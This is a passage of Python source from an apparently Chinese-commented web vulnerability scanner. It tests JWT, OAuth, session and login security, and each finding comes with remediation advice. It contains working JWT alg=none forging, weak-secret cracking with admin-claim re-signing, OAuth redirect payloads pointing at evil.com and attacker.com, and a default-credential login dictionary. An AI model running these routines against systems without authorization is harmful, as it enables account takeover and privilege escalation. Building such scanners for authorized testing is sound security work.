            self._advanced_weak_secrets = [
                str(s) for s in (advanced.get("weak_secrets") or []) if s
            ]
            return advanced
        except Exception as exc:  # noqa: BLE001
            logger.warning(f"⚠️ [JWT] 高级 payload 加载失败: {exc}")
            return {}

    def _get_advanced(self) -> Dict:
        """惰性加载高级 payload（只解析一次）。"""
        if not getattr(self, "_advanced_loaded", False):
            self._advanced_payloads = self._load_advanced_payloads()
            self._advanced_loaded = True
        return self._advanced_payloads

    async def detect_jwt_replay(
        self,
        url: str,
        jwt_token: str,
        session
    ) -> Optional[Dict]:
        headers = {'Authorization': f'Bearer {jwt_token}'}

        try:
            resp1 = await async_get(url, session=session, headers=headers, timeout=settings.timeout)
            if isinstance(resp1, tuple):
                status1, text1 = resp1[0], resp1[1]
            else:
                status1, text1 = resp1.status, await resp1.text()

            await asyncio.sleep(2)

            resp2 = await async_get(url, session=session, headers=headers, timeout=settings.timeout)
            if isinstance(resp2, tuple):
                status2, text2 = resp2[0], resp2[1]
            else:
                status2, text2 = resp2.status, await resp2.text()

            if status1 == status2 and text1 == text2:
                return {
                    'url': url,
                    'type': 'JWT 重放攻击',
                    'severity': 'Medium',
                    'confidence': 'medium',
                    'evidence': '相同 Token 两次请求返回相同响应',
                    'recommendation': '建议在 JWT 中添加 jti 字段或过期时间较短'
                }
        except Exception:
            logger.debug("suppressed exception (engine audit)")
        return None


    # ============================================================
    # A9: JWT 伪造验证（alg=none / 弱密钥） —— 主动提交伪造 Token，验证服务端是否接受
    # 不依赖 PyJWT，纯标准库实现（base64url + hmac），环境无第三方库也能跑。
    # ============================================================
    @staticmethod
    def _b64url_encode(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

    @staticmethod
    def _b64url_decode(seg: str) -> bytes:
        pad = "=" * (-len(seg) % 4)
        return base64.urlsafe_b64decode(seg + pad)

    def _jwt_parts(self, token: str):
        try:
            return token.split(".")
        except ValueError:
            return None

    def _jwt_forge_none(self, token: str) -> Optional[List[str]]:
        """alg=none 伪造：alg 改 none、去掉签名；返回常见两种接受形式。"""
        parts = self._jwt_parts(token)
        if not parts or len(parts) != 3:
            return None
        try:
            header = json.loads(self._b64url_decode(parts[0]))
            payload = json.loads(self._b64url_decode(parts[1]))
        except Exception:
            return None
        header["alg"] = "none"
        eh = self._b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        ep = self._b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        # 两种常见接受形式：空签名段 / 完全没有第三段
        return [f"{eh}.{ep}.", f"{eh}.{ep}"]

    def _jwt_crack(self, token: str) -> Optional[str]:
        """离线弱密钥爆破：用内置 WEAK_SECRETS 校验 HS* 签名，命中即返回密钥。"""
        import hmac, hashlib
        parts = self._jwt_parts(token)
        if not parts or len(parts) != 3:
            return None
        try:
            header = json.loads(self._b64url_decode(parts[0]))
        except Exception:
            return None
        alg = (header.get("alg") or "").upper()
        if not alg.startswith("HS"):
            return None
        mapping = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        digestmod = mapping.get(alg)
        if digestmod is None:
            return None
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        for secret in self.WEAK_SECRETS:
            mac = hmac.new(secret.encode(), signing_input, digestmod).digest()
            if self._b64url_encode(mac) == parts[2]:
                return secret
        return None

    def _jwt_forge_with_secret(self, token: str, secret: str, claims: Dict) -> Optional[str]:
        """用爆破到的密钥重签一个提权 Token。"""
        import hmac, hashlib
        parts = self._jwt_parts(token)
        if not parts or len(parts) != 3:
            return None
        try:
            header = json.loads(self._b64url_decode(parts[0]))
            payload = json.loads(self._b64url_decode(parts[1]))
        except Exception:
            return None
        payload.update(claims)
        alg = (header.get("alg") or "HS256").upper()
        mapping = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        digestmod = mapping.get(alg, hashlib.sha256)
        eh = self._b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        ep = self._b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        mac = hmac.new(secret.encode(), f"{eh}.{ep}".encode(), digestmod).digest()
        return f"{eh}.{ep}.{self._b64url_encode(mac)}"

    async def _jwt_accepted(self, ep: str, forged: str, session) -> Optional[bool]:
        """主动验证：用伪造 Token 访问端点；以垃圾 Token 作对照。
        若伪造 Token 返回 <400 而垃圾 Token 被拒(401/403)，判定接受伪造。"""
        try:
            trash = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ4In0.AAAAAA"
            st_ok, _, _ = await async_get(ep, session=session, timeout=8, no_retry=True,
                                          headers={"Authorization": f"Bearer {forged}"})
            st_bad, _, _ = await async_get(ep, session=session, timeout=8, no_retry=True,
                                           headers={"Authorization": f"Bearer {trash}"})
            if st_ok < 400 and st_bad in (401, 403):
                return True
            if st_ok < 400:  # 弱判定：伪造被接受即可疑
                return None
            return False
        except Exception:
            return None

    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
        """A9: 遍历端点，提取响应/头中的 JWT，主动验证 alg=none 与弱密钥伪造是否被接受。"""
        endpoints = kwargs.get("endpoints") or [target]
        findings: List[Dict] = []
        for ep in endpoints:
            if not isinstance(ep, str) or not ep:
                continue
            try:
                status, text, headers = await async_get(ep, session=session, timeout=8, no_retry=True)
            except Exception:
                continue
            tokens = set(re.findall(self.JWT_PATTERN, text or ""))
            for hname, hval in (headers or {}).items():
                if isinstance(hval, str) and ("authorization" in hname.lower() or "cookie" in hname.lower()):
                    tokens |= set(re.findall(self.JWT_PATTERN, hval))
            if not tokens:
                continue
            for tok in list(tokens)[:5]:
                for forged_none in (self._jwt_forge_none(tok) or []):
                    if await self._jwt_accepted(ep, forged_none, session) is True:
                        findings.append({
                            'url': ep, 'type': 'JWT-alg=none伪造', 'severity': 'High',
                            'ai_verdict': '疑似真实漏洞', 'confidence': 'medium',
                            'evidence': f'端点 {ep} 接受 alg=none 伪造 Token（垃圾 Token 被拒）',
                            'recommendation': '禁止 alg=none；严格校验签名算法白名单（仅允许预期算法）',
                            'method': 'jwt_none_forgery',
                        })
                        break
                secret = self._jwt_crack(tok)
                if secret:
                    forged_admin = self._jwt_forge_with_secret(
                        tok, secret, {"admin": True, "role": "admin", "is_admin": True})
                    if forged_admin and await self._jwt_accepted(ep, forged_admin, session) is True:
                        findings.append({
                            'url': ep, 'type': 'JWT-弱密钥伪造', 'severity': 'Critical',
                            'ai_verdict': '疑似真实漏洞', 'confidence': 'high',
                            'evidence': f'Token 使用弱密钥 "{secret}" 签名，可重签提权 Token 且被 {ep} 接受',
                            'recommendation': f'更换强随机密钥（当前 "{secret}" 过弱）；优先使用非对称算法(RS256)',
                            'method': 'jwt_weak_key_forgery',
                        })
        return findings


# ============================================================
# 3. OAuthEngine（增加 confidence 字段）
# ============================================================

class OAuthEngine(BaseEngine):
    """OAuth 2.0 / OpenID Connect 漏洞检测引擎"""

    name = "oauth"
    description = "OAuth 2.0 / OpenID Connect 漏洞检测引擎"

    AUTHORIZE_PATHS = [
        "/oauth/authorize", "/oauth2/authorize", "/authorize",
        "/login/oauth/authorize", "/oauth/auth", "/oauth/authorization",
        "/oauth/v1/authorize", "/oauth/v2/authorize", "/api/oauth/authorize",
        "/api/oauth2/authorize", "/connect/authorize", "/auth/authorize",
    ]

    TOKEN_PATHS = [
        "/oauth/token", "/oauth2/token", "/token",
        "/oauth/v1/token", "/oauth/v2/token", "/api/oauth/token",
        "/api/oauth2/token", "/connect/token", "/auth/token",
    ]

    REDIRECT_URI_PAYLOADS = [
        "https://evil.com/callback", "http://localhost:8080/callback",
        "https://attacker.com/oauth_callback", "http://127.0.0.1:8888/callback",
        "https://evil.com/oauth/callback", "http://localhost:3000/auth/callback",
        "https://attacker.com/callback?x=1", "https://evil.com/%2e%2e/",
        "https://evil.com//", "https://evil.com%2e%2e",
        # P2-3: 通配符/后缀匹配绕过变体
        "https://evil.com", "https://evil.com/",
        "https://evil.com/?x=", "https://evil.com#@target",
        "https://evil.com.evil.xyz", "https://evil.com%2f%2fcallback",
        "https://evil.com/%2e", "https://evil.com\u002e\u002e/",
    ]

    SCOPE_PAYLOADS = [
        "admin", "superuser", "root", "all", "*", "full_access",
        "bypass_2fa", "manage_account", "transfer_funds", "withdraw",
        "admin_all", "user:full_access", "openid offline_access admin",
        "wallet:accounts:all", "payment:process", "role:admin", "permission:all",
    ]

    CLIENT_ID_PAYLOADS = [
        "1234567890", "test", "public", "abc123", "client123",
        "webapp", "mobile", "spa", "admin", "system",
    ]

    OAUTH_INDICATORS = [
        "code=", "access_token=", "refresh_token=", "token_type=",
        "expires_in=", "scope=", "state=", "client_id=",
        "redirect_uri=", "response_type=code", "response_type=token",
        "grant_type=", "authorization_code", "implicit", "password",
        "client_credentials", "refresh_token",
    ]

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        if await self._is_oauth_endpoint(url):
            return {
                'url': url,
                'type': 'OAuth 端点发现',
                'ai_verdict': '信息',
                'confidence': 'medium',
                'evidence': f'发现 OAuth 端点: {url}',
                'diff_ratio': 0.0,
                'is_endpoint': True
            }
        return None

    async def _is_oauth_endpoint(self, url: str) -> bool:
        url_lower = url.lower()
        for path in self.AUTHORIZE_PATHS + self.TOKEN_PATHS:
            if path in url_lower:
                return True
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        if 'client_id' in qs or 'redirect_uri' in qs or 'response_type' in qs:
            return True
        return False

    async def discover_endpoints(self, base_url: str, session) -> List[Dict]:
        endpoints = []
        base = base_url.rstrip('/')

        for path in self.AUTHORIZE_PATHS:
            test_url = base + path
            try:
                resp = await async_get(test_url, session=session, timeout=5)
                if isinstance(resp, tuple):
                    status = resp[0]
                    text = resp[1]
                else:
                    status = resp.status
                    text = await resp.text()

                if status in (200, 400, 405) or 'oauth' in text.lower():
                    parsed = urlparse(test_url)
                    params = parse_qs(parsed.query)
                    endpoints.append({
                        'type': 'authorize',
                        'url': test_url,
                        'params': {k: v[0] if v else '' for k, v in params.items()},
                        'status': status
                    })
                    logger.info(f"🎯 发现 OAuth 授权端点: {test_url}")
            except Exception:
                logger.debug("suppressed exception (engine audit)")

        for path in self.TOKEN_PATHS:
            test_url = base + path
            try:
                resp = await async_get(test_url, session=session, timeout=5)
                if isinstance(resp, tuple):
                    status = resp[0]
                else:
                    status = resp.status

                if status in (200, 400, 405):
                    endpoints.append({
                        'type': 'token',
                        'url': test_url,
                        'params': {},
                        'status': status
                    })
                    logger.info(f"🎯 发现 OAuth Token 端点: {test_url}")
            except Exception:
                logger.debug("suppressed exception (engine audit)")

        return endpoints

    async def test_redirect_uri_hijack(self, url: str, params: Dict, session) -> Optional[Dict]:
        if 'redirect_uri' not in params:
            return None

        for evil_redirect in self.REDIRECT_URI_PAYLOADS[:5]:
            test_params = params.copy()
            test_params['redirect_uri'] = evil_redirect

            parsed = urlparse(url)
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))

            try:
                resp = await async_get(test_url, session=session, timeout=10, allow_redirects=False)
                if isinstance(resp, tuple):
                    status = resp[0]
                    headers = resp[2] if len(resp) > 2 else {}
                else:
                    status = resp.status
                    headers = resp.headers

                location = headers.get('Location', '')

                if status in (301, 302, 303):
                    evil_domain = evil_redirect.split('/')[2] if '://' in evil_redirect else ''
                    if evil_domain and evil_domain in location:
                        return {
                            'url': url,
                            'type': 'OAuth Redirect URI 劫持',
                            'severity': 'Critical',
                            'confidence': 'high',
                            'payload': evil_redirect,
                            'evidence': f'redirect_uri 可被篡改为 {evil_redirect}，授权码可能泄露',
                            'recommendation': '强制校验 redirect_uri 白名单'
                        }
                    if 'code=' in location:
                        return {
                            'url': url,
                            'type': 'OAuth Redirect URI 劫持（授权码泄露）',
                            'severity': 'Critical',
                            'confidence': 'high',
                            'payload': evil_redirect,
                            'evidence': f'redirect_uri 被篡改，响应包含授权码: {location[:100]}',
                            'recommendation': '强制校验 redirect_uri 白名单，绑定 client_id'
                        }
            except Exception:
                logger.debug("suppressed exception (engine audit)")
        return None

    async def test_state_missing(self, url: str, params: Dict) -> Optional[Dict]:
        if 'state' not in params or not params['state']:
            return {
                'url': url,
                'type': 'OAuth State 参数缺失',
                'severity': 'Medium',
                'confidence': 'high',
                'evidence': '授权请求中未包含 state 参数，可能存在 CSRF 攻击风险',
                'recommendation': '在授权请求中添加随机 state 参数，并在回调中验证'
            }
        return None

    async def test_scope_elevation(self, url: str, params: Dict, session) -> Optional[Dict]:
        if 'scope' not in params:
            return None

        orig_scope = params['scope']

        for evil_scope in self.SCOPE_PAYLOADS[:5]:
            new_scope = orig_scope + ' ' + evil_scope
            test_params = params.copy()
            test_params['scope'] = new_scope

            parsed = urlparse(url)
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))

            try:
                resp = await async_get(test_url, session=session, timeout=10, allow_redirects=False)
                if isinstance(resp, tuple):
                    status = resp[0]
                    headers = resp[2] if len(resp) > 2 else {}
                else:
                    status = resp.status
                    headers = resp.headers

                location = headers.get('Location', '')

                if status in (200, 302) and 'code=' in location and 'error' not in location:
                    return {
                        'url': url,
                        'type': 'OAuth Scope 权限提升',
                        'severity': 'High',
                        'confidence': 'medium',
                        'payload': evil_scope,
                        'evidence': f'允许添加额外 Scope: {evil_scope}，原 Scope: {orig_scope}',
                        'recommendation': '验证请求的 Scope 是否属于客户端允许的范围'
                    }
            except Exception:
                logger.debug("suppressed exception (engine audit)")
        return None

    async def test_client_id_swap(self, url: str, params: Dict, session) -> Optional[Dict]:
        if 'client_id' not in params:
            return None

        orig_client = params['client_id']

        for fake_client in self.CLIENT_ID_PAYLOADS[:5]:
            if fake_client == orig_client:
                continue

            test_params = params.copy()
            test_params['client_id'] = fake_client

            parsed = urlparse(url)
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))

            try:
                resp = await async_get(test_url, session=session, timeout=10, allow_redirects=False)
                if isinstance(resp, tuple):
                    status = resp[0]
                    headers = resp[2] if len(resp) > 2 else {}
                else:
                    status = resp.status
                    headers = resp.headers

                location = headers.get('Location', '')

                if status in (200, 302) and 'code=' in location:
                    return {
                        'url': url,
                        'type': 'OAuth Client ID 篡改',
                        'severity': 'High',
                        'confidence': 'medium',
                        'payload': fake_client,
                        'evidence': f'client_id 可被替换为 {fake_client}，仍返回授权码',
                        'recommendation': '验证 client_id 与回调 URI 的绑定关系'
                    }
            except Exception:
                logger.debug("suppressed exception (engine audit)")
        return None

    async def test_race_condition(self, url: str, params: Dict, session) -> Optional[Dict]:
        tasks = []
        for _ in range(5):
            parsed = urlparse(url)
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
            tasks.append(async_get(test_url, session=session, timeout=10, allow_redirects=False))

        responses = await asyncio.gather(*tasks, return_exceptions=True)

        success_codes = []
        for resp in responses:
            if isinstance(resp, Exception):
                continue
            if isinstance(resp, tuple):
                status = resp[0]
                headers = resp[2] if len(resp) > 2 else {}
            else:
                status = resp.status
                headers = resp.headers

            location = headers.get('Location', '')
            if status in (301, 302, 303) and 'code=' in location:
                success_codes.append(location)

        if len(success_codes) >= 2:
            return {
                'url': url,
                'type': 'OAuth 并发授权码竞争',
                'severity': 'High',
                'confidence': 'medium',
                'evidence': f'并发请求产生 {len(success_codes)} 个不同的授权码，可能存在竞争条件',
                'recommendation': '确保授权码只能使用一次，且用户会话与 code 绑定'
            }
        return None

    async def ai_analyze_oauth(self, url: str, params: Dict, response_text: str) -> Dict:
        prompt = f"""
你是一个 OAuth 安全专家。请分析以下 OAuth 授权请求，找出潜在的安全问题。

授权 URL: {url}
请求参数: {json.dumps(params, indent=2, ensure_ascii=False)}
响应片段: {response_text[:1000] if response_text else '无'}

请分析：
1. 是否存在 redirect_uri 劫持风险
2. 是否缺少 state 参数（CSRF 风险）
3. scope 是否包含敏感权限
4. 其他 OAuth 配置问题

输出 JSON：
{{
  "issues": ["问题1", "问题2"],
  "severity": "Critical/High/Medium/Low",
  "recommendations": ["建议1", "建议2"],
  "overall_score": 0-100
}}
"""
        try:
            from vulnclaw.ai.core import get_llm_client
            client = get_llm_client()
            result = await client.ask(
                prompt,
                system="只输出 JSON，不要解释。",
                temperature=0.1,
                wrap_data=True
            )
            cleaned = clean_ai_json(result)
            json_match = re.search(r'\{.*\}', cleaned, re.DOTALL)
            if json_match:
                return json.loads(json_match.group())
        except Exception as e:
            logger.debug(f"AI OAuth 分析失败: {e}")

        return {"issues": [], "severity": "Low", "recommendations": [], "overall_score": 70}

    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
        findings = []

        endpoints = await self.discover_endpoints(target, session)

        if not endpoints:
            logger.info("ℹ️ 未发现 OAuth 端点，跳过检测")
            return findings

        logger.info(f"🔍 发现 {len(endpoints)} 个 OAuth 端点")

        for endpoint in endpoints:
            if endpoint['type'] != 'authorize':
                continue

            url = endpoint['url']
            params = endpoint['params']

            logger.info(f"🔐 测试 OAuth 授权端点: {url}")

            result = await self.test_redirect_uri_hijack(url, params, session)
            if result:
                findings.append(result)

            result = await self.test_state_missing(url, params)
            if result:
                findings.append(result)

            result = await self.test_scope_elevation(url, params, session)
            if result:
                findings.append(result)

            result = await self.test_client_id_swap(url, params, session)
            if result:
                findings.append(result)

            result = await self.test_race_condition(url, params, session)
            if result:
                findings.append(result)

        logger.info(f"✅ OAuth 扫描完成，发现 {len(findings)} 个问题")
        return findings


# ============================================================
# 4. SessionEngine（增加 confidence 字段）
# ============================================================

class SessionEngine(BaseEngine):
    """会话安全检测引擎"""

    name = "session"
    description = "会话安全检测引擎"

    async def check(self, url, param, normal_resp, parsed_query, session, **kwargs) -> Optional[Dict]:
        return None

    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
        findings = []
        logger.info(f"🔐 开始 Session 安全检测: {target}")

        try:
            resp = await async_get(target, session=session, timeout=settings.timeout)
            if isinstance(resp, tuple):
                status, text, headers = resp
            else:
                await resp.text()
                headers = dict(resp.headers)

            set_cookie = headers.get("Set-Cookie", "")
            if set_cookie:
                findings.extend(self._analyze_cookie_security(set_cookie, target))

            if "jsessionid" in target.lower() or "sid=" in target.lower():
                findings.append({
                    "type": "Session ID 在 URL 中",
                    "url": target,
                    "severity": "High",
                    "confidence": "high",
                    "evidence": "Session ID 出现在 URL 中，可能泄露到 Referer/日志",
                    "recommendation": "使用 Cookie 传递 Session ID，不要放在 URL 中"
                })

            cookies = self._extract_cookies(set_cookie)
            for cookie_name, cookie_value in cookies.items():
                if "session" in cookie_name.lower() or "sid" in cookie_name.lower() or "token" in cookie_name.lower():
                    entropy_finding = self._analyze_session_id_entropy(cookie_name, cookie_value, target)
                    if entropy_finding:
                        findings.append(entropy_finding)

        except Exception as e:
            logger.warning(f"Session 检测失败: {e}")

        logout_findings = await self._test_logout_bypass(target, session)
        findings.extend(logout_findings)

        # P2-3: 会话固定 + 会话不失效检测
        findings.extend(await self._test_session_fixation(target, session))
        findings.extend(await self._test_session_no_expiry(target, session))

        unique = []
        seen = set()
        for f in findings:
            key = (f.get("type"), f.get("url"))
            if key not in seen:
                seen.add(key)
                unique.append(f)

        return unique

    def _extract_cookies(self, set_cookie: str) -> Dict[str, str]:
        cookies = {}
        for part in set_cookie.split(","):
            part = part.strip()
            if "=" in part:
                name, value = part.split("=", 1)
                cookies[name.strip()] = value.strip()
        return cookies

    def _analyze_cookie_security(self, set_cookie: str, url: str) -> List[Dict]:
        findings = []
        cookie_parts = [p.strip() for p in set_cookie.split(",")]

        for cookie in cookie_parts:
            if "=" not in cookie:
                continue
            name = cookie.split("=")[0].strip()

            if "secure" not in cookie.lower():
                findings.append({
                    "type": "Cookie 缺少 Secure 标志",
                    "url": url,
                    "severity": "Medium",
                    "confidence": "high",
                    "evidence": f"Cookie {name} 未设置 Secure 标志，可能通过 HTTP 明文传输",
                    "recommendation": "为 Cookie 添加 Secure 标志，确保仅通过 HTTPS 传输"
                })

            if "httponly" not in cookie.lower():
                findings.append({
                    "type": "Cookie 缺少 HttpOnly 标志",
                    "url": url,
                    "severity": "Medium",
                    "confidence": "high",
                    "evidence": f"Cookie {name} 未设置 HttpOnly 标志，可能被 XSS 窃取",
                    "recommendation": "为 Cookie 添加 HttpOnly 标志，防止 XSS 窃取"
                })

            if "samesite" not in cookie.lower():
                findings.append({
                    "type": "Cookie 缺少 SameSite 标志",
                    "url": url,
                    "severity": "Low",
                    "confidence": "medium",
                    "evidence": f"Cookie {name} 未设置 SameSite 标志，可能存在 CSRF 风险",
                    "recommendation": "设置 SameSite=Lax 或 Strict 防止 CSRF"
                })

        return findings

    def _analyze_session_id_entropy(self, cookie_name: str, cookie_value: str, url: str) -> Optional[Dict]:
        if len(cookie_value) < 16:
            return {
                "type": "Session ID 长度过短",
                "url": url,
                "severity": "Medium",
                "confidence": "high",
                "evidence": f"Session ID ({cookie_name}) 长度仅 {len(cookie_value)} 字符，低于 16 字符安全标准",
                "recommendation": "生成至少 128 位（约 32 字符）的 Session ID"
            }

        if re.match(r'^[0-9]+$', cookie_value):
            return {
                "type": "Session ID 字符集过于简单",
                "url": url,
                "severity": "Medium",
                "confidence": "high",
                "evidence": f"Session ID ({cookie_name}) 仅包含数字，可预测性高",
                "recommendation": "使用包含大小写字母和数字的随机 Session ID"
            }

        if re.match(r'^\d{10}$', cookie_value):
            return {
                "type": "Session ID 可能为时间戳",
                "url": url,
                "severity": "High",
                "confidence": "high",
                "evidence": f"Session ID ({cookie_name}) 看起来像时间戳，可能可预测",
                "recommendation": "使用加密安全的随机数生成 Session ID"
            }

        return None

    async def _test_logout_bypass(self, target: str, session) -> List[Dict]:
        findings = []

        logout_paths = ["/logout", "/signout", "/exit", "/auth/logout"]
        for path in logout_paths:
            logout_url = target.rstrip("/") + path
            try:
                resp = await async_get(logout_url, session=session, timeout=5, allow_redirects=False)
                if isinstance(resp, tuple):
                    status = resp[0]
                else:
                    status = resp.status

                if status in (302, 303):
                    findings.append({
                        "type": "注销端点发现",
                        "url": logout_url,
                        "severity": "Info",
                        "confidence": "medium",
                        "evidence": f"发现注销端点，状态码 {status}",
                        "recommendation": "手动验证注销后 Session 是否失效"
                    })
                    break
            except:
                logger.debug("suppressed exception (engine audit)")

        return findings

    async def _test_session_fixation(self, target: str, session) -> List[Dict]:
        """P2-3: 会话固定检测——注入攻击者指定的 Session ID，
        若服务器接受并在后续响应中继续使用 → 登录后未重新生成会话，存在固定漏洞。"""
        findings = []
        try:
            resp = await async_get(target, session=session, timeout=settings.timeout)
            if isinstance(resp, tuple):
                _, _, headers = resp
            else:
                headers = dict(resp.headers)
            set_cookie = headers.get("Set-Cookie", "")
            cookies = self._extract_cookies(set_cookie)
            session_names = [n for n in cookies if "session" in n.lower() or "sid" in n.lower() or "token" in n.lower()]
            if not session_names:
                return findings
            session_name = session_names[0]
            fixed_value = "vulnclaw_fixed_sess_0001"
            custom_cookie = f"{session_name}={fixed_value}"
            # 携带攻击者指定的固定 Session ID 访问目标
            resp2 = await async_get(
                target, session=session,
                headers={"Cookie": custom_cookie},
                timeout=settings.timeout, allow_redirects=False,
            )
            if isinstance(resp2, tuple):
                resp2_headers = resp2[2] if len(resp2) > 2 else {}
            else:
                resp2_headers = dict(resp2.headers)
            new_set_cookie = resp2_headers.get("Set-Cookie", "")
            if fixed_value in new_set_cookie:
                findings.append({
                    "type": "会话固定（Session Fixation）",
                    "url": target,
                    "severity": "High",
                    "confidence": "high",
                    "evidence": f"服务器接受攻击者指定的 Session ID '{session_name}={fixed_value}' 并在后续响应中继续使用，登录后未重新生成会话",
                    "recommendation": "登录成功时必须重新生成 Session ID，且不继承登录前会话"
                })
            elif not new_set_cookie:
                # 未重新下发 Session Cookie → 可能沿用注入值
                findings.append({
                    "type": "会话固定疑似（未重新生成 Session）",
                    "url": target,
                    "severity": "Medium",
                    "confidence": "medium",
                    "evidence": f"注入 '{session_name}={fixed_value}' 后服务器未重新生成会话 Cookie，存在会话固定风险",
                    "recommendation": "登录成功时重新生成 Session ID 并轮换 Cookie 值"
                })
        except Exception as e:
            logger.warning(f"会话固定检测失败: {e}")
        return findings

    async def _test_session_no_expiry(self, target: str, session) -> List[Dict]:
        """P2-3: 会话不失效检测——Session Cookie 无过期时间（长会话/并发登录不失效风险）。"""
        findings = []
        try:
            resp = await async_get(target, session=session, timeout=settings.timeout)
            if isinstance(resp, tuple):
                _, _, headers = resp
            else:
                headers = dict(resp.headers)
            set_cookie = headers.get("Set-Cookie", "")
            if not set_cookie:
                return findings
            cookies = self._extract_cookies(set_cookie)
            session_names = [n for n in cookies if "session" in n.lower() or "sid" in n.lower()]
            if not session_names:
                return findings
            if "expires" not in set_cookie.lower() and "max-age" not in set_cookie.lower():
                findings.append({
                    "type": "Session Cookie 无过期时间",
                    "url": target,
                    "severity": "Low",
                    "confidence": "medium",
                    "evidence": f"会话 Cookie ({session_names[0]}) 未设置 Expires/Max-Age，仅随浏览器关闭失效；"
                                "若注销后会话仍有效则存在'同时登录不失效'风险",
                    "recommendation": "设置合理的会话过期时间；注销时强制服务端使会话失效"
                })
        except Exception:
            logger.debug("suppressed exception (engine audit)")
        return findings


# ============================================================
# 导出
# ============================================================

class WeakCredentialEngine(BaseEngine):
    """弱口令 / 默认凭据检测引擎（CWE-521）

    安全约束（避免退化为无节制爆破）：
    - 仅对明确识别出的登录端点尝试，端点数量硬上限 MAX_ENDPOINTS；
    - 字典仅含常见默认凭据与极弱口令，不是大字典暴力破解；
    - 命中即停止该端点的后续尝试，不再继续尝试其它口令。
    """

    name = "weak_credential"
    description = "弱口令/默认凭据检测（CWE-521）"

    LOGIN_PATHS = (
        "/login", "/signin", "/api/login", "/api/auth/login", "/auth/login",
        "/admin/login", "/administrator", "/wp-login.php", "/user/login",
        "/api/v1/login", "/api/signin", "/account/login", "/api/token",
    )

    # 常见默认凭据与极弱口令（设备/中间件默认账号 + TOP 弱口令）
    DEFAULT_CREDENTIALS = (
        ("admin", "admin"), ("admin", "123456"), ("admin", "password"),
        ("admin", "admin123"), ("admin", "12345678"), ("admin", "1q2w3e4r"),
        ("admin", "changeme"), ("administrator", "administrator"),
        ("administrator", "admin"), ("root", "root"), ("root", "toor"),
        ("root", "123456"), ("test", "test"), ("test", "123456"),
        ("guest", "guest"), ("user", "user"), ("user", "123456"),
        ("demo", "demo"), ("sa", "sa"), ("oracle", "oracle"),
        ("postgres", "postgres"), ("mysql", "mysql"), ("ftp", "ftp"),
    )

    SUCCESS_HINTS = (
        "dashboard", "welcome", "logout", "sign out", "token", "jwt",
        "user_id", "登录成功", "欢迎", "我的账户",
    )
    FAILURE_HINTS = (
        "invalid", "incorrect", "unauthorized", "bad credentials", "wrong password",
        "login failed", "authentication failed", "错误", "失败", "用户名或密码",
    )

    MAX_ENDPOINTS = 3
    TIMEOUT = 6

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        """参数级入口：弱口令需提交登录请求体，统一走 scan() 全局扫描。"""
        return None

    async def scan(self, target: str, session, **kwargs) -> List[Dict]:
        """检测目标登录端点是否存在默认凭据/极弱口令。"""
        findings: List[Dict] = []
        parsed = urlparse(target)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        logger.info(f"🔍 [WeakCredential] 检测弱口令/默认凭据: {target}")

        endpoints = await self._discover_login_endpoints(base_url, session)
        if not endpoints:
            logger.info("   ℹ️ 未发现登录端点，跳过弱口令检测")
            return findings

        for url in endpoints[: self.MAX_ENDPOINTS]:
            hit = await self._try_default_credentials(url, session)
            if hit:
                findings.append(hit)

        logger.info(f"   ✅ WeakCredential 完成，发现 {len(findings)} 个问题")
        return findings

    async def _discover_login_endpoints(self, base_url: str, session) -> List[str]:
        """探测登录端点：200 需含登录表单特征，401/405 视为 API 认证端点。"""
        endpoints: List[str] = []
        for path in self.LOGIN_PATHS:
            url = base_url.rstrip("/") + path
            try:
                resp = await async_get(url, session=session, timeout=self.TIMEOUT, no_retry=True)
                status = resp[0]
                text = resp[1] or ""
            except Exception:
                continue
            if status in (401, 405):
                endpoints.append(url)
            elif status == 200:
                lowered = (text or "").lower()
                if "password" in lowered or "login" in lowered or "登录" in lowered:
                    endpoints.append(url)
        return endpoints

    async def _try_default_credentials(self, url: str, session) -> Optional[Dict]:
        """用默认凭据字典尝试登录，命中即返回 finding（随后停止尝试）。"""
        base_status, base_text, _ = await self._post_login(
            url, "__vulnclaw_nouser__", "__vulnclaw_nopass__", session
        )
        if base_status is None:
            return None

        for username, password in self.DEFAULT_CREDENTIALS:
            status, text, headers = await self._post_login(url, username, password, session)
            if status is None:
                continue
            if self._is_success(status, text, headers, base_status, base_text):
                return {
                    "url": url,
                    "type": "weak_credential_default",
                    "severity": "Critical" if username in ("admin", "root", "administrator") else "High",
                    "title": f"默认凭据/弱口令可登录：{username}/{password}",
                    "description": (
                        f"登录端点 {url} 接受常见默认凭据 `{username}/{password}`，"
                        f"攻击者无需破解即可直接接管账户（CWE-521）。"
                    ),
                    "remediation": "立即修改默认口令，启用强口令策略、登录失败锁定与多因素认证。",
                    "recommendation": "修改默认口令并强制首次登录改密；启用 MFA 与失败锁定。",
                    "parameter": "username/password",
                    "method": "POST",
                    "evidence": (
                        f"POST {url} username={username} -> HTTP {status}"
                        f"（与失败基线 HTTP {base_status} 不同，且返回会话凭据或成功特征）"
                    ),
